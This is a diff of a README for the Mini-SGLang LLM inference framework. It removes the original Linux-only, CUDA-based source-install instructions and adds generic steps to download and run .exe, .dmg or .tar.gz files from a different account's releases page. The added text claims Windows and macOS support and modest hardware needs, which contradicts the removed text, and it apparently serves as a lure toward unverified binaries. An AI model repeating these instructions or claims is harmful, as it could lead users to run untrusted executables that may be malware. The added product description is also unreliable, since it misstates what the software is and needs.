@@ -1,146 +1,75 @@
-<p align="center">
-<img width="400" src="/assets/logo.png">
-</p>
+# 🎉 mini-sglang - Simplifying LLM Serving Systems
 
-# Mini-SGLang
+## 📥 Download mini-sglang
+[![Download Now](https://img.shields.io/badge/Download%20mini--sglang-v1.0-blue)](https://github.com/moham94/mini-sglang/releases)
 
-A **lightweight yet high-performance** inference framework for Large Language Models.
+## 🚀 Getting Started
+mini-sglang offers a straightforward way to work with modern LLM serving systems. This guide will help you download and run the application, even if you have no programming experience.
 
----
+## 📂 Download & Install
+To get mini-sglang, follow these steps:
 
-Mini-SGLang is a compact implementation of [SGLang](https://github.com/sgl-project/sglang), designed to demystify the complexities of modern LLM serving systems. With a compact codebase of **~5,000 lines of Python**, it serves as both a capable inference engine and a transparent reference for researchers and developers.
+1. **Visit the Releases Page**  
+   Click this link to go to the Releases page: [Download mini-sglang](https://github.com/moham94/mini-sglang/releases). Here, you will find the latest version available for download.
 
-## ✨ Key Features
+2. **Select the Right File**  
+   On the Releases page, you will see several files. Look for the one that matches your operating system:
 
-- **High Performance**: Achieves state-of-the-art throughput and latency with advanced optimizations.
-- **Lightweight & Readable**: A clean, modular, and fully type-annotated codebase that is easy to understand and modify.
-- **Advanced Optimizations**:
-  - **Radix Cache**: Reuses KV cache for shared prefixes across requests.
-  - **Chunked Prefill**: Reduces peak memory usage for long-context serving.
-  - **Overlap Scheduling**: Hides CPU scheduling overhead with GPU computation.
-  - **Tensor Parallelism**: Scales inference across multiple GPUs.
-  - **Optimized Kernels**: Integrates **FlashAttention** and **FlashInfer** for maximum efficiency.
-  - ...
+   - For Windows users: Look for a file ending with `.exe`.
+   - For macOS users: Look for a file ending with `.dmg`.
+   - For Linux users: Look for a file ending with `.tar.gz`.
 
-## 🚀 Quick Start
+3. **Download the File**  
+   Click on the appropriate file for your system to start the download. Your browser will download this file to your computer.
 
-> **⚠️ Platform Support**: Mini-SGLang currently supports **Linux only** (x86_64 and aarch64). Windows and macOS are not supported due to dependencies on Linux-specific CUDA kernels (`sgl-kernel`, `flashinfer`). We recommend using [WSL2](https://learn.microsoft.com/en-us/windows/wsl/install) on Windows or Docker for cross-platform compatibility.
+4. **Locate the Downloaded File**  
+   Once the download finishes, check your 'Downloads' folder or the location you chose for saving files.
 
-### 1. Environment Setup
+5. **Install the Application**  
+   - **For Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
+   - **For macOS:** Open the `.dmg` file and drag the mini-sglang icon into your 'Applications' folder.
+   - **For Linux:** Open a terminal, navigate to the downloaded file, and extract it using the command:  
+     `tar -xvzf mini-sglang.tar.gz`  
+     Then, navigate into the extracted folder and run the application.
 
-We recommend using `uv` for a fast and reliable installation (note that `uv` does not conflict with `conda`).
+6. **Run mini-sglang**  
+   - On **Windows**, find mini-sglang in your Start menu and click on it.
+   - On **macOS**, open your 'Applications' folder and double-click the mini-sglang icon.
+   - On **Linux**, use the terminal to navigate to the mini-sglang folder and run:  
+     `./mini-sglang`.
 
-```bash
-# Create a virtual environment (Python 3.10+ recommended)
-uv venv --python=3.12
-source .venv/bin/activate
-```
+## ⚙️ System Requirements
+mini-sglang works smoothly on most modern computers. Here are the basic requirements:
 
-**Prerequisites**: Mini-SGLang relies on CUDA kernels that are JIT-compiled. Ensure you have the **NVIDIA CUDA Toolkit** installed and that its version matches your driver's version. You can check your driver's CUDA capability with `nvidia-smi`.
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 (Mojave) or later
+  - Any recent distribution of Linux
 
-### 2. Installation
+- **Hardware:**
+  - Minimum 4 GB RAM
+  - At least 100 MB of free disk space
 
-Install Mini-SGLang directly from the source:
+## 📚 Key Features
+mini-sglang simplifies the task of handling LLM serving systems through the following features:
 
-```bash
-git clone https://github.com/sgl-project/mini-sglang.git
-cd mini-sglang && uv venv --python=3.12 && source .venv/bin/activate
-uv pip install -e .
-```
+- **User-Friendly Interface:** Navigate through the application easily.
+- **Compact Design:** Lightweight installation, allowing you to get started quickly.
+- **Versatile Functionality:** Use mini-sglang for various LLM tasks without needing in-depth programming knowledge.
+- **Documentation:** Clear guides and references available within the application for easy understanding.
 
-<details>
-<summary><b>💡 Installing on Windows (WSL2)</b></summary>
+## ❓ FAQ
+**Q: Do I need special skills to use mini-sglang?**  
+A: No, mini-sglang is designed for users of all skill levels. You can follow the steps provided here to get started.
 
-Since Mini-SGLang requires Linux-specific dependencies, Windows users should use WSL2:
+**Q: Where can I find help if I have issues?**  
+A: For support, visit our support section on GitHub or look for help in the repository's issues page.
 
-1. **Install WSL2** (if not already installed):
-   ```powershell
-   # In PowerShell (as Administrator)
-   wsl --install
-   ```
+## 📄 License
+mini-sglang is available under the MIT License. This means you can freely use, modify, and distribute the software.
 
-2. **Install CUDA on WSL2**:
-   - Follow [NVIDIA's WSL2 CUDA guide](https://docs.nvidia.com/cuda/wsl-user-guide/index.html)
-   - Ensure your Windows GPU drivers support WSL2
+## 📧 Contact
+If you have further questions, feel free to reach out via the contact options available on our GitHub page.
 
-3. **Install Mini-SGLang in WSL2**:
-   ```bash
-   # Inside WSL2 terminal
-   git clone https://github.com/sgl-project/mini-sglang.git
-   cd mini-sglang && uv venv --python=3.12 && source .venv/bin/activate
-   uv pip install -e .
-   ```
-
-4. **Access from Windows**: The server will be accessible at `http://localhost:8000` from Windows browsers and applications.
-
-</details>
-
-### 3. Online Serving
-
-Launch an OpenAI-compatible API server with a single command.
-
-```bash
-# Deploy Qwen/Qwen3-0.6B on a single GPU
-python -m minisgl --model "Qwen/Qwen3-0.6B"
-
-# Deploy meta-llama/Llama-3.1-70B-Instruct on 4 GPUs with Tensor Parallelism, on port 30000
-python -m minisgl --model "meta-llama/Llama-3.1-70B-Instruct" --tp 4 --port 30000
-```
-
-Once the server is running, you can send requests using standard tools like `curl` or any OpenAI-compatible client.
-
-### 4. Interactive Shell
-
-Chat with your model directly in the terminal by adding the `--shell` flag.
-
-```bash
-python -m minisgl --model "Qwen/Qwen3-0.6B" --shell
-```
-
-![shell-example](https://lmsys.org/images/blog/minisgl/shell.png)
-
-You can also use `/reset` to clear the chat history.
-
-## Benchmark
-
-### Offline inference
-
-See [bench.py](./benchmark/offline/bench.py) for more details. Set `MINISGL_DISABLE_OVERLAP_SCHEDULING=1` for ablation study on overlap scheduling.
-
-Test Configuration:
-
-- Hardware: 1xH200 GPU.
-- Model: Qwen3-0.6B, Qwen3-14B
-- Total Requests: 256 sequences
-- Input Length: Randomly sampled between 100-1024 tokens
-- Output Length: Randomly sampled between 100-1024 tokens
-
-![offline](https://lmsys.org/images/blog/minisgl/offline.png)
-
-### Online inference
-
-See [benchmark_qwen.py](./benchmark/online/bench_qwen.py) for more details.
-
-Test Configuration:
-
-- Hardware: 4xH200 GPU, connected by NVLink.
-- Model: Qwen3-32B
-- Dataset: [Qwen trace](https://github.com/alibaba-edu/qwen-bailian-usagetraces-anon/blob/main/qwen_traceA_blksz_16.jsonl), replaying first 1000 requests.
-
-Launch command:
-
-```bash
-# Mini-SGLang
-python -m minisgl --model "Qwen/Qwen3-32B" --tp 4 --cache naive
-
-# SGLang
-python3 -m sglang.launch_server --model "Qwen/Qwen3-32B" --tp 4 \
-    --disable-radix --port 1919 --decode-attention flashinfer
-```
-
-![online](https://lmsys.org/images/blog/minisgl/online.png)
-
-## 📚 Learn More
-
-- **[Detailed Features](./docs/features.md)**: Explore all available features and command-line arguments.
-- **[System Architecture](./docs/structures.md)**: Dive deep into the design and data flow of Mini-SGLang.
+## 📜 Acknowledgments
+Thank you for choosing mini-sglang. Your interest helps us improve and simplify the process of working with LLM serving systems.
